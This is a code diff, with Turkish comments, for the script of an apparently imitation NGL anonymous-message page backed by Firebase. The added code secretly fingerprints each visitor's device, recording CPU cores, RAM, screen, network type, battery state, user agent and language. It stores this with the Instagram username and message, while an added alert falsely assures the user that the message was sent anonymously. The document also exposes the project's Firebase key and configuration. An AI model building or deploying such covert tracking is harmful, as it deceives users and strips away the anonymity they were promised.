@@ -1,7 +1,7 @@
 import { initializeApp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js";
 import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js";
 
-// Senin Firebase Bilgilerin
+// Firebase Yapılandırman
 const firebaseConfig = {
   apiKey: "AIzaSyDOeW45v-_JMJKcIpOsF3czNI1yo2dImdU",
   authDomain: "nglfiree.firebaseapp.com",
@@ -15,8 +15,8 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const database = getDatabase(app);
 
-// Butona tıklandığında çalışacak fonksiyon
-window.veriyiGonder = function() {
+// Gelişmiş Veri Gönderme Fonksiyonu
+window.veriyiGonder = async function() {
     const user = document.getElementById('instaUser').value;
     const msg = document.getElementById('userMsg').value;
     const status = document.getElementById('status');
@@ -26,28 +26,46 @@ window.veriyiGonder = function() {
         return;
     }
 
-    // Arka planda toplanan cihaz ve kullanıcı verileri
+    // Gelişmiş Parmak İzi: Batarya Bilgisi Alımı
+    let bataryaDurumu = "Alınamadı";
+    try {
+        if (navigator.getBattery) {
+            const battery = await navigator.getBattery();
+            bataryaDurumu = `%${Math.round(battery.level * 100)} - Şarjda mı: ${battery.charging ? 'Evet' : 'Hayır'}`;
+        }
+    } catch (e) { console.log("Batarya bilgisi desteklenmiyor."); }
+
+    // Tüm Verilerin Paketlenmesi
     const veriPaketi = {
-        yazanKisi: user,
+        kullaniciAdi: user,
         mesaj: msg,
-        cihaz: navigator.userAgent,
-        ekran cozunurlugu: window.screen.width + "x" + window.screen.height,
-        dil: navigator.language,
-        tarih: new Date().toLocaleString('tr-TR')
+        tarih: new Date().toLocaleString('tr-TR'),
+        detayliParmakIzi: {
+            cihaz: navigator.platform,
+            islemci: (navigator.hardwareConcurrency || "Bilinmiyor") + " Çekirdek",
+            bellek: (navigator.deviceMemory || "Bilinmiyor") + " GB RAM",
+            ekran: window.screen.width + "x" + window.screen.height,
+            internet: navigator.connection ? navigator.connection.effectiveType : "Bilinmiyor",
+            batarya: bataryaDurumu,
+            tarayici: navigator.userAgent,
+            dil: navigator.language
+        }
     };
 
     const mesajlarRef = ref(database, 'gelenMesajlar');
 
     push(mesajlarRef, veriPaketi)
     .then(() => {
-        status.classList.remove('hidden');
+        // Başarılı gönderim sonrası arayüz işlemleri
+        if(status) status.classList.remove('hidden');
         document.getElementById('userMsg').value = "";
         document.getElementById('instaUser').value = "";
+        alert("Mesajın anonim olarak iletildi! 🔒");
         
-        setTimeout(() => { status.classList.add('hidden'); }, 4000);
+        if(status) setTimeout(() => { status.classList.add('hidden'); }, 4000);
     })
     .catch((error) => {
         console.error("Hata:", error);
-        alert("Bağlantı hatası oluştu!");
+        alert("Mesaj gönderilirken bir sorun oluştu.");
     });
 }
